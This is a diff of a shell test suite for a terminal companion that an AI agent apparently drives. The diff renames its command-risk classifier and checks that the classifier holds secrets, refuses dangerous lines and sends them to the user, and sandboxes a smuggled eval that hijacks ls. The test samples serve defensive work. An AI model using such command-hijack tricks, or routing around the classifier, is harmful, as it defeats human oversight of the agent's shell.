     run "$TERMINAL" run -- 'head -c 300000 /dev/zero | tr "\0" a; echo; echo last-line'
     [ "$status" -eq 0 ]
-    [[ "$output" == *$'output cut: the last 32768 bytes, from the first full line\n'* ]] || false
+    [[ "$output" == *$'output cut: the last 16384 bytes, from the first full line\n'* ]] || false
     [[ "$output" == *$'last-line\nexit=0' ]] || false
-    [ "${#output}" -lt 34000 ]
+    [ "${#output}" -lt 17000 ]
 }
 
-@test "laya status names the server of this companion" {
-    "$TERMINAL" open >/dev/null
-    run "$TERMINAL" laya status
-    [ "$status" -eq 0 ]
-    [[ "$output" == *$'\nserver=external health=ok' ]] || false
-    stop_fake_laya
-    run "$TERMINAL" laya status
-    [ "$status" -eq 0 ]
-    [[ "$output" == *$'\nserver=external health=failed' ]] || false
+@test "clef status names the server of CLUX_CLEF_URL" {
+    run "$TERMINAL" clef status
+    [ "$output" = "url=$CLUX_CLEF_URL"$'\nkey=set\nhost=loopback\nserver=answers' ] \
+        || { echo "$output"; false; }
+    stop_fake_clef
+    run "$TERMINAL" clef status
+    [[ "$output" == *$'\nserver=no answer' ]] || { echo "$output"; false; }
 }
 
-@test "run refuses when text came on the prompt line while Laya examined the command" {
-    set_fake_laya '{"rules": [{"contains": "clux-slow", "delay": 2}]}'
+@test "run refuses when text came on the prompt line while Clef examined the command" {
+    set_fake_clef '{"rules": [{"contains": "clux-slow", "delay": 2}]}'
     "$TERMINAL" open >/dev/null
     local out="$BATS_TEST_TMPDIR/run.out" mark="$BATS_TEST_TMPDIR/typed" pid rc
     "$TERMINAL" run -- 'echo clux-slow' > "$out" 2>&1 3>&- &
@@ -1234,15 +1155,15 @@ lock_holder() {
     [[ "$output" == *'next'* ]] || false
 }
 
-@test "wait --pattern does not match the held-by-laya marker" {
+@test "wait --pattern does not match the held-by-clef marker" {
     "$TERMINAL" open >/dev/null
     "$TERMINAL" send --enter -- 'echo AKIAABCDEFGHIJKLMNOP' >/dev/null
     "$TERMINAL" wait --timeout 5 --idle >/dev/null
     run "$TERMINAL" read
-    [[ "$output" == *'[held by laya: secret'* ]] || { echo "$output"; false; }
+    [[ "$output" == *'[held by clef: secret'* ]] || { echo "$output"; false; }
     run "$TERMINAL" wait --timeout 2 --pattern 'held'
     [ "$status" -eq 1 ]
-    run "$TERMINAL" wait --timeout 2 --pattern 'laya'
+    run "$TERMINAL" wait --timeout 2 --pattern 'clef'
     [ "$status" -eq 1 ]
 }
 
@@ -1257,7 +1178,7 @@ lock_holder() {
 }
 
 @test "a line that send ends at the clux prompt runs in a subshell, also a split eval" {
-    set_fake_laya '{"rules": [{"contains": "clux-danger", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
+    set_fake_clef '{"rules": [{"contains": "clux-danger", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
     "$TERMINAL" open >/dev/null
     run "$TERMINAL" send --enter -- "eval 'ls() { echo HIJACKED; }'"
     [ "$status" -eq 0 ] || { echo "$output"; false; }
@@ -1339,7 +1260,7 @@ lock_holder() {
 }
 
 @test "in a program, send checks the cursor and a dangerous line goes to the user" {
-    set_fake_laya '{"rules": [{"contains": "clux-danger", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
+    set_fake_clef '{"rules": [{"contains": "clux-danger", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
     "$TERMINAL" open >/dev/null
     "$TERMINAL" send --enter -- 'python3 -q' >/dev/null
     pane_shows '>>>'
@@ -1353,7 +1274,7 @@ lock_holder() {
     "$TERMINAL" send --key C-c >/dev/null
     run "$TERMINAL" send --enter -- 'import os  # clux-danger'
     [ "$status" -eq 6 ]
-    [ "$output" = 'laya: dangerous (destructive 0.95): ask the user to type this line in the pane' ]
+    [ "$output" = 'clef: dangerous (destructive 0.95): ask the user to type this line in the pane' ]
     "$TERMINAL" send --key C-d >/dev/null
 }
 
@@ -1385,25 +1306,6 @@ lock_holder() {
     [ "$status" -eq 0 ]
     run "$TERMINAL" run -- 'echo alive'
     [[ "$output" == *$'\nalive\n'* ]] || { echo "$output"; false; }
-}
-
-@test "open starts a new laya server when the server that it started is gone" {
-    local data="$BATS_TEST_TMPDIR/data" d pid new
-    make_fake_venv "$data/clux/laya"
-    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
-    export CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf"
-    "$TERMINAL" open >/dev/null
-    d=$(companion_dir)
-    pid=$(sed -n 's/^laya_pid=//p' "$d/state")
-    kill -9 "$pid"; while kill -0 "$pid" 2>/dev/null; do sleep .1; done
-    run "$TERMINAL" open
-    [ "$status" -eq 0 ] || { echo "$output"; false; }
-    new=$(sed -n 's/^laya_pid=//p' "$d/state")
-    [ -n "$new" ] && [ "$new" != "$pid" ]
-    kill -0 "$new"
-    run "$TERMINAL" run -- 'echo back'
-    [[ "$output" == *$'\nback\n'* ]] || { echo "$output"; false; }
-    "$TERMINAL" close
 }
 
 @test "python3 that send starts in the pane gets no shell rule" {
@@ -1671,26 +1573,17 @@ lock_holder() {
 }
 
 # Background 3
-@test "the watchdog closes a background companion and stops its laya server when the owner process ends" {
+@test "the watchdog closes a background companion when the owner process ends" {
     bg_setup
     bg_add_cache
-    local data="$BATS_TEST_TMPDIR/data" d pid i=0
-    make_fake_venv "$data/clux/laya"
-    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
-    run env CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" \
-        "$TERMINAL" open
+    local data="$BATS_TEST_TMPDIR/data" d
+    run env XDG_DATA_HOME="$data" "$TERMINAL" open
     [ "$status" -eq 0 ] || { echo "$output"; false; }
     d=$(bg_dir)
-    pid=$(sed -n 's/^laya_pid=//p' "$d/state")
-    [ -n "$pid" ]
-    kill -0 "$pid"
     kill "$CLAUDE_PID"
     wait "$CLAUDE_PID" 2>/dev/null || true
     wait_gone "$d" 15 || { echo 'the directory stayed'; false; }
     [ "$(bg_window_count)" = 1 ] || { echo 'the window stayed'; false; }
-    i=0
-    while kill -0 "$pid" 2>/dev/null && [ "$i" -lt 25 ]; do sleep .2; i=$((i + 1)); done
-    ! kill -0 "$pid" 2>/dev/null || { kill -9 "$pid"; echo 'the laya server stayed'; false; }
 }
 
 # The directory lock: open, close, the watchdog and the reaper make or remove
